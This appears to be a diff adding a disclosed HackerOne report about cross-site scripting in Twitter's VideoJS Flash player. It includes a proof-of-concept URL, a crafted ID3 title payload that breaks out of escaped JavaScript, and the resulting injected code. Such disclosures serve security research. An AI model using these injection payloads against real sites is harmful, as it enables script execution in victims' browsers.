@@ -1,0 +1,36 @@
+ReportLink:https://hackerone.com/reports/29360
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/batram
+ReportedTo:Twitter(twitter)
+BountyAmount:1120.0
+Severity:
+State:Closed
+DateOfDisclosure:17.11.2014 14:30:53
+
+Summary:
+
+https://platform.twitter.com/video/video-js.1e43b81a2f30220a16fd493aaf072451.swf
+
+VideoJS does not escape metadata passed to JavaScript via ExternalInterface. 
+Since VideoJS does not load a required policy file to read metadata from mp3s loaded from an external server via http we need to use rtmp. Also other metadata send from the server (like the servername) can be used to gain JavaScript-Execution.
+
+__PoC:__
+https://platform.twitter.com/video/video-js.1e43b81a2f30220a16fd493aaf072451.swf?eventProxyFunction=console.log&autoplay=true&rtmpStream=mp3:haha&rtmpConnection=rtmp://not-a-real-example-rtmp-server.com/
+
+_Example File:_
+http://batr.am/haha.mp3
+
+ID3:
+
+    Title: \"})})))}finally{confirm(/moin/)}//
+
+
+Resulting JS:
+
+    try { __flash__toXML(console.log("plugin","loadedmetadata",({audiochannels:2,tags:({TIT2:"\\"})})))}finally{confirm(/moin/)}//"}),audiosamplerate:44100,audiocodecid:".mp3",bandwidth:368,endTimestamp:1.881,Server:"C++ RTMP Media Server (www.rtmpd.com)",totalFramesCount:73,duration:1.881,fileSize:47104,videoFramesCount:0,startTimestamp:0,audioFramesCount:0,stereo:true}))) ; } catch (e) { "<undefined/>"; }
+
+Tested with:
+C++ RTMP Media Server (www.rtmpd.com)
+
+Win 8.1 | Google Chrome Version 39.0.2166.2 dev-m (64-bit) | Flash plugin 15.0.0.152
+Win 8.1 | Mozilla Firefox Version 32.0.3 | Flash plugin 15.0.0.152
